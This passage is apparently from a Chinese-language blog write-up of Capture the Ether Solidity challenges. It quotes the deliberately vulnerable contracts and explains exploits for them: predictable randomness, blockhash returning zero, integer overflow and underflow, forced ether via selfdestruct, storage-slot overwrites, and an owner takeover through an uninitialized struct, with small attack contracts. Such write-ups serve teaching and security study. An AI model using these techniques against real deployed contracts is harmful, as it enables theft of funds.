<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract pwn &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> pwn() <span class="keyword">public</span> payable &#123;</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.<span class="keyword">number</span> - <span class="number">1</span>), now));</span><br><span class="line">        GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(x........);</span><br><span class="line">        challenge.guess.<span class="keyword">value</span>(<span class="number">1</span> ether)(answer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> () <span class="keyword">public</span> payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> byebye()&#123;</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>几个注意的点，攻击合约记得写一个payable 的 fallback函数，不然题目转不进来钱，攻击会失败。</p>
<p>攻击合约记得留一个取钱的函数，不然题目是完成了，钱留在攻击合约里取不出来（别问我为什么知道的）</p>
<p>如上的取钱方式不太安全其实，可以把自己的地址硬编码进去，或者加一个onlyowner的修饰器，不然谁都能去拿你攻击合约的钱了。（不过这是在测试链，也就无所谓了。）</p>
<h2 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h2><p>This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.</p>
<p>Note that it is indeed possible to solve this challenge without losing any ether.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheFutureChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = n;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line"></span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=TH5USLpPa_0" target="_blank" rel="noopener">I Predict</a>.</p>
<p>这一次的guess不太一样了， 需要你提前把答案锁进去，然后在你觉得合适的时候去settle()。</p>
<p>不过注意到这个answer虽然是uint8类型的，但是模10了所以只有十种可能。那就直接大力了。</p>
<p>随便选一个数存进去（根据概率分布，建议选5），然后就不停的调用settle就好了，一个块调一次。数学期望来看嘛大概十次就行了。</p>
<h2 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a>Predict the block hash</h2><p>Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = hash;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer = block.blockhash(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=VbTrdj7vPGU" target="_blank" rel="noopener">Get Lucky</a>.</p>
<p>这回没办法了，让你提前猜好256bit的值，完了，芭比Q了。</p>
<p>这里就需要用到一个函数特性了。block.blockhash只能查到近256个块的hash值，大于256个块的，返回0。</p>
<p><img src="https://s2.loli.net/2022/03/07/KCkHqB3dyiURZVa.png" alt="image-20220307135839208"></p>
<p>所以我们提前把0给锁进去，然后，去吃个饭，玩会游戏。等一百个块过去了，再去取就好了。</p>
<h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><p>These challenges use a variety of techniques, but they all involve a bit of math.</p>
<h2 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a>Token sale</h2><p>This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether.</p>
<p>The contract starts off with a balance of 1 ether. See if you can take some of that away.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN = 1 ether;</span><br><span class="line"></span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value == numTokens * PRICE_PER_TOKEN);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] += numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -= numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=tgIqecROs5M" target="_blank" rel="noopener"><del>Sale</del> Sail</a>.</p>
<p>这道题目搞了个类似numTokens的代币，可以买卖，和eth的兑换比例是1比1，然后合约内置 1 eth，你需要让合约的钱少于 1eth。那么显然是要搞点差价出来，一半能想到的就是溢出了，不是上溢，就是下溢。</p>
<p>注意到这里的静态变量PRICE_PER_TOKEN，虽然是 1，但是单位是 ether，所以实际上他是 10^18，那么这里就是上溢了。</p>
<p><img src="https://s2.loli.net/2022/03/07/3zihIBREKn7aoqj.png" alt="image-20220307140523283"></p>
<p>只需要给415992086870360064wei，大概是0.4个以太，就能获得115792089237316195423570985008687907853269984665640564039458个token。</p>
<p>（可惜是自己部署的题目合约，里面只有1个以太，不然，，，一比一，，直接起飞了。）</p>
<h2 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h2><p>This ERC20-compatible token is hard to acquire. There’s a fixed supply of 1,000 tokens, all of which are yours to start with.</p>
<p>Find a way to accumulate at least 1,000,000 tokens to solve this challenge.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name = &quot;Simple ERC20 Token&quot;;</span><br><span class="line">    string public symbol = &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line"></span><br><span class="line">    function TokenWhaleChallenge(address _player) public &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        totalSupply = 1000;</span><br><span class="line">        balanceOf[player] = 1000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return balanceOf[player] &gt;= 1000000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public &#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[from] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        require(allowance[from][msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=cvcA8truev4" target="_blank" rel="noopener">Tough Decisions</a>.</p>
<p>找个题目好长）初始有一千个代币，然后解题条件是不少于1,000,000个。</p>
<p>整个代码看下来，会发现 transferFrom 方法的底层是调用了 _transfer，而 _transfer 是直接扣的 msg.sender 的钱。这里的逻辑是比较奇怪的。一般来说transferFrom 是被授权一方花授权人的钱的，类似于你允许网易于app花你的钱自动续费会员。然后看到transferFrom检查的内容，仍然是from用户的存款是否大于要value，from用户给msg.sender用户的授权花费金额是否大于value，然后检查一下 to 用户的金额是否存在一个上溢的风险。所以对实际上被扣款的 msg.sender 的存款是没有检查的。 _transfer这里也是直接用的 -=，所以这里是可以存在下溢。</p>
<p>攻击流程：</p>
<ol>
<li>首先设自己的号为主号，就是题目合约设定的 player，然后我门再开一下小号。</li>
<li>此时我们把主号的1000个代币全部转给小号</li>
<li>用小号给主号approve 1000个代币的授权，approve(address 主号, 1000)</li>
<li>换回主号，调用transferFrom，用小号的代币（其实是主号的代币）给小号转1000个（或以下）的代币。</li>
<li>此时小号手里应该有1100个代币，而主号手里的代币应该是 2^256-1000，题目完成。</li>
</ol>
<h2 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h2><p>This retirement fund is what economists call a <a href="https://en.wikipedia.org/wiki/Commitment_device" target="_blank" rel="noopener">commitment device</a>. I’m trying to make sure I hold on to 1 ether for retirement.</p>
<p>I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I <em>do</em> withdraw early, 10% of my ether goes to the <code>beneficiary</code> (you!).</p>
<p>I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract RetirementFundChallenge &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner = msg.sender;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration = now + 10 years;</span><br><span class="line"></span><br><span class="line">    function RetirementFundChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        beneficiary = player;</span><br><span class="line">        startBalance = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        if (now &lt; expiration) &#123;</span><br><span class="line">            // early withdrawal incurs a 10% penalty</span><br><span class="line">            msg.sender.transfer(address(this).balance * 9 / 10);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            msg.sender.transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectPenalty() public &#123;</span><br><span class="line">        require(msg.sender == beneficiary);</span><br><span class="line"></span><br><span class="line">        uint256 withdrawn = startBalance - address(this).balance;</span><br><span class="line"></span><br><span class="line">        // an early withdrawal occurred</span><br><span class="line">        require(withdrawn &gt; 0);</span><br><span class="line"></span><br><span class="line">        // penalty is what&apos;s left</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=Mx0xCI1jaUM" target="_blank" rel="noopener">Smooth Criminal</a>.</p>
<p>这道题目初始内置了1个eth，然后你可以调用collectPenalty()取出eth。但是要求是 withdrawn 要大于 startBalance - address(this).balance; 也就是账户里需要少于1个eth。但是换个思路，这里的withdrawn是startBalance - address(this).balance;只要这个账户里的钱大于一个以太，就能产生下溢，从而也能大于0了。</p>
<p>不过这个合约并没有payable的函数。但是solidity有个特性，就是可以用selfdestruct函数，”自爆“来进行强行转账。</p>
<p>所以我们部署一个自爆合约，这个合约转一个wei，然后就能取出里面所有的钱了。</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pragma</span> solidity ^<span class="number">0.4</span>.<span class="number">21</span>;</span><br><span class="line">contract pwn &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title">pwn</span>() public payable &#123;</span><br><span class="line">        selfdestruct(0x....);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h2><p>Who needs <code>mapping</code>s? I’ve created a contract that can store key/value pairs using just an array.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    function set(uint256 key, uint256 value) public &#123;</span><br><span class="line">        // Expand dynamic array as needed</span><br><span class="line">        if (map.length &lt;= key) &#123;</span><br><span class="line">            map.length = key + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get(uint256 key) public view returns (uint256) &#123;</span><br><span class="line">        return map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=A259WnFMRXI" target="_blank" rel="noopener">Map To My Heart</a>.</p>
<p>这道题目虽然有isComplete，但是没看到改变它状态的函数啊。</p>
<p>这道题的考点在于状态变量的储存结构，之前bank那道题有提到过的。这里有一个动态数组map，</p>
<p><img src="https://s2.loli.net/2022/03/07/XHT5hGoZbvpukVx.png" alt="image-20220307143331281"></p>
<p>而且题目的set函数还悉心的帮你更改了map的长度，所以就可以任意地址写了。然后注意到isComplete变量是存在slot0的最右一个bit的，所以我们计算一下这个动态数组的起点应该是 keccak256(uint(1))，然后因为最大值是 2^256，直接溢出去到0就可以了。set( 2^256 - keccak256(uint(1)),1)</p>
<h2 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h2><p>A candidate you don’t like is accepting campaign contributions via the smart contract below.</p>
<p>To complete this challenge, steal the candidate’s ether.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    struct Donation &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function DonationChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        // amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale = 10**18 * 1 ether;</span><br><span class="line">        require(msg.value == etherAmount / scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp = now;</span><br><span class="line">        donation.etherAmount = etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        </span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=_AUXpnB065o" target="_blank" rel="noopener">Space Force</a>.</p>
<p>这道题也是Bank那道题的其中一个考点，注意到donate函数里面结构体的声明并没有初始化，也没有说明存储在那里，所以默认是在storage上，然后这个结构体有两个uint256参数，所以就会修改掉slot0 和slot1上的原有变量。</p>
<p>那么注意到这里的解题条件是获取合约里面所有的eth，然后只有withdraw函数能取钱，不过只有owner才行。所以我们需要成为owner。注意到owner应该是存在slot1里的，然后这个结构体我们可以利用donate控制的是etherAmount变量，刚好可以改掉owner，那么我们就把etherAmount的值给成我们自己账户的地址，再根据条件计算一下需要支付的费用就行了。最后withdraw一把梭，把所有的钱都转出来，题目完成。</p>
<h2 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h2><p>This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later.</p>
<p>All you have to do to complete this challenge is wait 50 years and withdraw the ether. If you’re not that patient, you’ll need to combine several techniques to hack this contract.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract FiftyYearsChallenge &#123;</span><br><span class="line">    struct Contribution &#123;</span><br><span class="line">        uint256 amount;</span><br><span class="line">        uint256 unlockTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line">    Contribution[] queue;</span><br><span class="line">    uint256 head;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function FiftyYearsChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        owner = player;</span><br><span class="line">        queue.push(Contribution(msg.value, now + 50 years));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upsert(uint256 index, uint256 timestamp) public payable &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;</span><br><span class="line">            // Update existing contribution amount without updating timestamp.</span><br><span class="line">            Contribution storage contribution = queue[index];</span><br><span class="line">            contribution.amount += msg.value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // Append a new contribution. Require that each contribution unlock</span><br><span class="line">            // at least 1 day after the previous one.</span><br><span class="line">            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</span><br><span class="line"></span><br><span class="line">            contribution.amount = msg.value;</span><br><span class="line">            contribution.unlockTimestamp = timestamp;</span><br><span class="line">            queue.push(contribution);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 index) public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        require(now &gt;= queue[index].unlockTimestamp);</span><br><span class="line"></span><br><span class="line">        // Withdraw this and any earlier contributions.</span><br><span class="line">        uint256 total = 0;</span><br><span class="line">        for (uint256 i = head; i &lt;= index; i++) &#123;</span><br><span class="line">            total 